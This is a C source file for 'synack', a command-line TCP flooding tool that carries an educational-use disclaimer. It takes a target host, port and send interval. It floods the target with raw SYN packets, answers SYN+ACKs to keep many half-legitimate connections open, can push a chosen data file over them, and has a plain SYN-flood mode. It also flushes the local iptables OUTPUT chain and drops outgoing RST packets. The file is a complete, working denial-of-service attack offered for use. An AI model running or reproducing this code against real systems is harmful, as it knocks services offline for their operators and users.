/* Created by edubart FOR EDUCATIONAL AND TESTING purposes only.
 * Project page https://github.com/edubart/synack
 */

#include "leef.h"

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/time.h>

int running = 1;
uint32_t interface_addr;
uint32_t dest_addr;
uint16_t dest_port;
uint32_t sleep_interval;
uint16_t attack_uuid;
int attack_time = 0;
uint8_t *send_data = NULL;
int send_data_size = 0;
int syn_flood_only = 0;

void signal_handler(int sig) {
    running = 0;
}

void syn_thread()
{
    leef_srand();

    uint16_t src_port = leef_random_range(1025,65535);
    uint16_t id;
    uint32_t seq;

    while(running && (attack_time <= 0 || leef_get_ticks() < attack_time)) {
        if(++src_port <= 1024)
            src_port = 1025;
        id = leef_random_byte() << 8 | leef_random_byte();
        seq = attack_uuid << 16 | id;
        leef_send_tcp_syn(interface_addr, dest_addr, src_port, dest_port, id, seq);
        usleep(sleep_interval);
    }
}

void sniff_thread()
{
    uint16_t src_port;
    uint16_t id;
    uint32_t seq;
    uint32_t ack_seq;
    uint32_t lastTicks;
    int syn_sent = 0;
    int synack_received = 0;
    int rst_received = 0;
    int fin_received = 0;
    int alive_connections = 0;
    int new_connections = 0;
    struct leef_sniffed_packet packet;
    int conn_ports[65536];

    memset(conn_ports, 0, sizeof(conn_ports));

    /* setup iptables */
    system("/usr/sbin/iptables -F OUTPUT");
    system("/usr/sbin/iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP");

    lastTicks = leef_get_ticks();

    printf("wait 1 sec\r");
    fflush(stdout);

    while(running && (attack_time <= 0 || leef_get_ticks() < attack_time)) {
        if(leef_sniff_next_packet(&packet)) {
            /* check if the packet is from the host */
            if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && packet.in_ip.tcp->source == dest_port) {
                /* check if the packet was from this running attack instance */
                if(packet.in_ip.tcp->ack == 1 && attack_uuid != ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16))
                    continue;
                src_port = packet.in_ip.tcp->dest;
                /* SYN+ACK */
                if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 1) {
                    if(!syn_flood_only) {
                        id = ((packet.in_ip.tcp->ack_seq - 1) & 0xffff) + 1;
                        seq = packet.in_ip.tcp->ack_seq;
                        ack_seq = packet.in_ip.tcp->seq + 1;

                        if(send_data_size) {
                            leef_send_raw_tcp(interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq,
                                              TCP_ACK | TCP_PUSH, 5840, 64, send_data_size, send_data);
                        } else {
                            leef_send_tcp_ack(interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq);
                        }
                    }

                    synack_received++;
                    if(!syn_flood_only && conn_ports[src_port] == 0) {
                        conn_ports[src_port] = 1;
                        alive_connections++;
                        new_connections++;
                    }
                /* RST */
                } else if(packet.in_ip.tcp->rst == 1) {
                    static int warned = 0;
                    if(!warned && rst_received >= 0) {
                        printf("\nhost started rejecting connections\n");
                        fflush(stdout);
                        warned = 1;
                    }

                    rst_received++;

                    if(!syn_flood_only && conn_ports[src_port] == 1) {
                        alive_connections--;
                        conn_ports[src_port] = 0;
                    }
                /* FIN */
                } else if(packet.in_ip.tcp->fin == 1) {
                    static int warned = 0;
                    if(!warned && fin_received == 0) {
                        printf("\nhost started ending connections, guessed connection timeout: %d secs\n", leef_get_ticks() / 1000);
                        fflush(stdout);
                        warned = 1;
                    }

                    fin_received++;

                    if(!syn_flood_only && conn_ports[src_port] == 1) {
                        alive_connections--;
                        conn_ports[src_port] = 0;
                    }
                }
            /* check if the packet is to the host */
            } else if(packet.ip->protocol == IPPROTO_TCP &&
                      packet.ip->saddr == interface_addr && packet.ip->daddr == dest_addr && packet.in_ip.tcp->dest == dest_port
                      && packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0) {
                if(attack_uuid != ((packet.in_ip.tcp->seq & 0xffff0000) >> 16))
                    continue;
                syn_sent++;
                if(!syn_flood_only && conn_ports[packet.in_ip.tcp->source] == 1) {
                    conn_ports[packet.in_ip.tcp->source] = 0;
                    alive_connections--;
                }
            }
        }

        if(leef_get_ticks() - lastTicks >= 1000) {
            printf("SYN: %d/s, SYN+ACK: %d/s, RST: %d/s, FIN: %d/s, NEW CONNs: %d/sec, FAILED CONNs: %d/sec, ALIVE CONNs: %d\n",
                   syn_sent, synack_received, rst_received, fin_received, new_connections, syn_sent - new_connections, alive_connections);
            fflush(stdout);

            synack_received = 0;
            rst_received = 0;
            fin_received = 0;
            syn_sent = 0;
            new_connections = 0;
            lastTicks = leef_get_ticks();
        }
    }
    printf("\n");
}

int main(int argc, char **argv)
{
    signal(SIGTERM, &signal_handler);
    signal(SIGINT, &signal_handler);
    signal(SIGHUP, &signal_handler);
    signal(SIGKILL, &signal_handler);

    if(!leef_init())
        return -1;
    leef_set_sniff_packet_size(128);

    if(argc < 5) {
        printf("Usage: %s <interface ip> <host> <port> <interval> [options]\n", argv[0]);
        printf("Options: \n");
        printf("-t [attack time]\t- Attack time in seconds\n");
        printf("-d [file]\t- Send binary file as data when establishing connections\n");
        printf("-n \t- Do not establish connections, do a simple SYN flood\n");
        printf("* send interval in microseconds\n");
        printf("* default attack time: infinite\n");
        return 0;
    }

    /* generate attack uuid */
    static struct timeval tv;
    gettimeofday(&tv, 0);
    attack_uuid = (((tv.tv_sec % 1000) * 1000) + (tv.tv_usec / 1000)) & 0xffff;

    interface_addr = leef_resolve_hostname(argv[1]);
    dest_addr = leef_resolve_hostname(argv[2]);
    dest_port = atoi(argv[3]);
    sleep_interval = atoi(argv[4]);

    int arg;
    const char *opt;
    for(arg=5;arg<argc;arg++) {
        opt = argv[arg];
        if(opt && opt[0] == '-' && strlen(opt) == 2) {
            switch(opt[1]) {
                case 't':
                    attack_time = atoi(argv[++arg])*1000;
                    break;
                case 'd': {
                    FILE *fp = fopen(argv[++arg], "rb");
                    if(fp) {
                        fseek(fp, 0, SEEK_END);
                        send_data_size = ftell(fp);
                        fseek(fp, 0, SEEK_SET);
                        send_data = (uint8_t *) malloc(send_data_size);
                        fread(send_data, send_data_size, 1, fp);
                        fclose(fp);
                    } else {
                        fprintf(stderr, "could not find data file %s\n", argv[arg]);
                        return -1;
                    }
                    break;
                }
                case 'n':
                    syn_flood_only = 1;
                    break;
                default:
                    fprintf(stderr, "incorrect option %s\n", opt);
                    return -1;
            }
        } else {
            fprintf(stderr, "incorrect option %s\n", opt);
            return -1;
        }
    }

    printf("stating synack..\n");
    printf("target: %s:%d\n", leef_addr_to_string(dest_addr), dest_port);

    pid_t pid = fork();
    if(pid == 0) // child
        syn_thread();
    else
        sniff_thread();

    leef_terminate();
    return 0;
}
